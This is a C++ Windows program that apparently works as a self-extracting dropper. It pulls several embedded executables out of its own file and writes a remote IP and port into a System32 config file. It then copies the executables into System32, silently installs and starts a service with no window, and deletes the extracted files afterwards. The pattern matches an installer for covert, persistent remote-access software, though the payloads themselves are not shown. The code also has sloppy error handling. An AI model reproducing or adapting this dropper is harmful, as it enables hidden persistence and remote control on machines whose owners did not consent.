#include <iostream>
#include <Windows.h>
#include <string>
#include <fstream>
#include <locale>

bool unpuck(std::string& name)
{
	setlocale(LC_ALL, "Russian");

	LARGE_INTEGER sizeSetup = { 0 };
	LARGE_INTEGER sizebReader = { 0 };
	LARGE_INTEGER sizeImageService = { 0 };
	LARGE_INTEGER sizeInfo = { 0 };
	LARGE_INTEGER sizeloop = { 0 };
	LARGE_INTEGER sizeSservice = { 0 };
	DWORD check;
	char isize[100];

	sizeSetup.QuadPart = 45056;
	sizebReader.QuadPart = 17920;
	sizeImageService.QuadPart = 49664;
	sizeInfo.QuadPart = 0;
	sizeloop.QuadPart = 18432;
	sizeSservice.QuadPart = 19456;

	HANDLE hSetupThis = CreateFileA(&name[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	HANDLE hSetup = CreateFileA("Install.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hbReader = CreateFileA("bReader.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hImageService = CreateFileA("ImageService.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hInfo = CreateFileA("Info.txt", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hloop = CreateFileA("loop.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE hSservice = CreateFileA("sService.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hSservice == INVALID_HANDLE_VALUE || hSetupThis == INVALID_HANDLE_VALUE || hSetup == INVALID_HANDLE_VALUE || hbReader == INVALID_HANDLE_VALUE || hImageService == INVALID_HANDLE_VALUE || hInfo == INVALID_HANDLE_VALUE || hloop == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't open or create files:\n";
		if (hSetupThis == INVALID_HANDLE_VALUE)
			std::cout << "Installer\\Setup.exe;\n";
		if (hSetup == INVALID_HANDLE_VALUE)
			std::cout << "Setup.exe;\n";
		if (hbReader == INVALID_HANDLE_VALUE)
			std::cout << "bReader.exe;\n";
		if (hImageService == INVALID_HANDLE_VALUE)
			std::cout << "ImageServicp.exe;\n";
		if (hInfo == INVALID_HANDLE_VALUE)
			std::cout << "Info.exe;\n";
		if (hloop == INVALID_HANDLE_VALUE)
			std::cout << "loop.exe;\n";
		if (hSservice == INVALID_HANDLE_VALUE)
			std::cout << "sService.exe;\n";
		return false;
	}

	char* bufSetup = new char[sizeSetup.QuadPart];
	char* bufbReader = new char[sizebReader.QuadPart];
	char* bufImageService = new char[sizeImageService.QuadPart];
	char* bufInfo;
	char* bufloop = new char[sizeloop.QuadPart];
	char* bufSservice = new char[sizeSservice.QuadPart];

	ReadFile(hSetupThis, bufSetup, sizeSetup.QuadPart, &check, NULL);
	if (check != sizeSetup.QuadPart)
	{
		std::cout << "Can't read Setup.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	WriteFile(hSetup, bufSetup, sizeSetup.QuadPart, &check, NULL);
	if (check != sizeSetup.QuadPart)
	{
		std::cout << "Can't write to Setup.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}

	ReadFile(hSetupThis, bufbReader, sizebReader.QuadPart, &check, NULL);
	if (check != sizebReader.QuadPart)
	{
		std::cout << "Can't read bReader.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	WriteFile(hbReader, bufbReader, sizebReader.QuadPart, &check, NULL);
	if (check != sizebReader.QuadPart)
	{
		std::cout << "Can't write to bReader.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}

	ReadFile(hSetupThis, bufImageService, sizeImageService.QuadPart, &check, NULL);
	if (check != sizeImageService.QuadPart)
	{
		std::cout << "Can't read ImageService.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	WriteFile(hImageService, bufImageService, sizeImageService.QuadPart, &check, NULL);
	if (check != sizeImageService.QuadPart)
	{
		std::cout << "Can't write to ImageService.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}

	ReadFile(hSetupThis, isize, 100, &check, NULL);
	if (check != 100)
	{
		std::cout << "Can't read Info.exe size...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}

	sizeInfo.QuadPart = atoi(isize);
	bufInfo = new char[sizeInfo.QuadPart];

	ReadFile(hSetupThis, bufInfo, sizeInfo.QuadPart, &check, NULL);
	if (check != sizeInfo.QuadPart)
	{
		std::cout << "Can't read Info.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufInfo;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	WriteFile(hInfo, bufInfo, sizeInfo.QuadPart, &check, NULL);
	if (check != sizeInfo.QuadPart)
	{
		std::cout << "Can't write to Info.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufInfo;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}

	ReadFile(hSetupThis, bufloop, sizeloop.QuadPart, &check, NULL);
	if (check != sizeloop.QuadPart)
	{
		std::cout << "Can't read loop.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufInfo;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	WriteFile(hloop, bufloop, sizeloop.QuadPart, &check, NULL);
	if (check != sizeloop.QuadPart)
	{
		std::cout << "Can't write to loop.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufInfo;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	
	ReadFile(hSetupThis, bufSservice, sizeSservice.QuadPart, &check, NULL);
	if (check != sizeSservice.QuadPart)
	{
		std::cout << "Can't read sService.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufInfo;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	WriteFile(hSservice, bufSservice, sizeSservice.QuadPart, &check, NULL);
	if (check != sizeSservice.QuadPart)
	{
		std::cout << "Can't write to sService.exe...\n";
		CloseHandle(hSetupThis);
		CloseHandle(hSetup);
		CloseHandle(hbReader);
		CloseHandle(hImageService);
		CloseHandle(hInfo);
		CloseHandle(hloop);
		delete[] bufSetup;
		delete[] bufbReader;
		delete[] bufImageService;
		delete[] bufInfo;
		delete[] bufloop;
		delete[] bufSservice;
		return false;
	}
	
	CloseHandle(hSetupThis);
	CloseHandle(hSetup);
	CloseHandle(hbReader);
	CloseHandle(hImageService);
	CloseHandle(hInfo);
	CloseHandle(hloop);
	CloseHandle(hSservice);

	delete[] bufSetup;
	delete[] bufbReader;
	delete[] bufImageService;
	delete[] bufInfo;
	delete[] bufloop;
	delete[] bufSservice;

	return true;
}

int main(int argc, char* argv[])
{
	setlocale(LC_ALL, "Russian");
	int i = 0;
	while (argv[0][i++]);
	while (argv[0][i] != '\\') --i;
	++i;
	std::string name;
	while (argv[0][i])
		name += argv[0][i++];

	if (!unpuck(name))
	{
		system("pause");
		return 0;
	}

	char dir[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, dir);

	std::string d = dir;
	d += "\\ImageService.exe";

	std::ifstream info;
	info.open("info.txt");
	if (!info.is_open())
	{
		std::cout << "Can't open info.txt..." << std::endl;
		system("pause");
		return 0;
	}

	char cinfo[50];
	char ch;
	int q = 0;
	while (!info.eof())
	{
		info.get(ch);
		cinfo[q] = ch;
		++q;
	}
	info.close();
	cinfo[--q] = '\0';

	char port[10];
	char ip[25];

	q = 0;
	int p = 0;
	while (cinfo[q] != ' ') ++q;
	++q;
	while (cinfo[q] != '\n')
		port[p++] = cinfo[q++];
	port[p] = '\0';
	while (cinfo[q] != ' ') ++q;
	while (cinfo[q] == ' ') ++q;
	p = 0;
	while (cinfo[q] != '\0')
		ip[p++] = cinfo[q++];
	ip[p] = '\0';

	DWORD code;
	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	std::string com = d + " install";

	//Installing config info:

	std::string t = " ";
	t += port;
	t += " ";
	t += ip;

	std::ofstream file("C:\\Windows\\System32\\imageConf.txt");
	file << &t[0];
	file.close();

	//

	//Copying service <loop>:

	std::string from = dir;
	from += "\\loop.exe";
	HANDLE csFile = CreateFileA(&from[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	LARGE_INTEGER tSize = { 0 };
	GetFileSizeEx(csFile, &tSize);
	long long int size = tSize.QuadPart;

	if (csFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't open loop.exe...\nError: " << GetLastError() << std::endl;
		std::cout << from << std::endl;
		system("pause");
		return 0;
	}
	else
	{
		char* buf = new char[size];
		DWORD read;
		ReadFile(csFile, buf, size, &read, nullptr);
		if (size != read)
			return 0;
		HANDLE wsFile = CreateFileA("C:\\Windows\\System32\\loop.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (wsFile == INVALID_HANDLE_VALUE)
		{
			std::cout << "Can't create loop.exe...\nError: " << GetLastError() << std::endl;
			system("pause");
			return 0;
		}

		WriteFile(wsFile, buf, size, &read, nullptr);
		if (size != read)
			return 0;
		delete[] buf;
		CloseHandle(wsFile);
	}

	//copying service <ImageService>

	from = dir;
	from += "\\ImageService.exe";
	HANDLE isFile = CreateFileA(&from[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	GetFileSizeEx(isFile, &tSize);
	size = tSize.QuadPart;
	if (isFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't open ImageService.exe...\nError: " << GetLastError() << std::endl;
		system("pause");
		return 0;
	}
	else
	{
		char* buf = new char[size];
		DWORD read;
		ReadFile(isFile, buf, size, &read, nullptr);
		if (size != read)
			return 0;
		HANDLE wiFile = CreateFileA("C:\\Windows\\System32\\ImageService.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(wiFile, buf, size, &read, nullptr);

		if (wiFile == INVALID_HANDLE_VALUE)
		{
			std::cout << "Can't create ImageService.exe...\nError: " << GetLastError() << std::endl;
			system("pause");
			return 0;
		}

		if (size != read)
			return 0;
		delete[] buf;
		CloseHandle(wiFile);
	}

	//copying service <sService>

	from = dir;
	from += "\\sService.exe";
	HANDLE sServiceFile = CreateFileA(&from[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	GetFileSizeEx(sServiceFile, &tSize);
	size = tSize.QuadPart;
	if (sServiceFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't open sService.exe...\nError: " << GetLastError() << std::endl;
		system("pause");
		return 0;
	}
	else
	{
		char* buf = new char[size];
		DWORD read;
		ReadFile(sServiceFile, buf, size, &read, nullptr);
		if (size != read)
			return 0;
		HANDLE wiFile = CreateFileA("C:\\Windows\\System32\\sService.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(wiFile, buf, size, &read, nullptr);

		if (wiFile == INVALID_HANDLE_VALUE)
		{
			std::cout << "Can't create sService.exe...\nError: " << GetLastError() << std::endl;
			system("pause");
			return 0;
		}

		if (size != read)
			return 0;
		delete[] buf;
		CloseHandle(wiFile);
	}

	//copying service <bReader>

	from = dir;
	from += "\\bReader.exe";
	HANDLE brFile = CreateFileA(&from[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	GetFileSizeEx(brFile, &tSize);
	size = tSize.QuadPart;
	if (brFile == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't open bReader.exe...\nError: " << GetLastError() << std::endl;
		system("pause");
		return 0;
	}
	else
	{
		char* buf = new char[size];
		DWORD read;
		ReadFile(brFile, buf, size, &read, nullptr);
		if (size != read)
			return 0;
		HANDLE wiFile = CreateFileA("C:\\Windows\\System32\\bReader.exe", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		WriteFile(wiFile, buf, size, &read, nullptr);

		if (wiFile == INVALID_HANDLE_VALUE)
		{
			std::cout << "Can't create ImageService.exe...\nError: " << GetLastError() << std::endl;
			system("pause");
			return 0;
		}

		if (size != read)
			return 0;
		delete[] buf;
		CloseHandle(wiFile);
	}

	CloseHandle(csFile);
	CloseHandle(isFile);
	CloseHandle(brFile);
	CloseHandle(sServiceFile);

	CreateProcessA(nullptr, &com[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
	if (pi.hProcess == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't start process to install service...\nError: " << GetLastError() << std::endl;
		system("pause");
		return 0;
	}
	WaitForSingleObject(pi.hProcess, INFINITE);
	com = d + " start";
	CreateProcessA(nullptr, &com[0], nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	if (pi.hProcess == INVALID_HANDLE_VALUE)
	{
		std::cout << "Can't start process to start service...\nError: " << GetLastError() << std::endl;
		system("pause");
		return 0;
	}

	HANDLE hSetup = CreateFileA("Install.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	HANDLE hbReader = CreateFileA("bReader.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	HANDLE hImageService = CreateFileA("ImageService.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	HANDLE hInfo = CreateFileA("Info.txt", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	HANDLE hloop = CreateFileA("loop.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
	HANDLE hSservice = CreateFileA("sService.exe", GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);

	CloseHandle(hSetup);
	CloseHandle(hbReader);
	CloseHandle(hImageService);
	CloseHandle(hInfo);
	CloseHandle(hloop);
	CloseHandle(hSservice);

	return 0;
}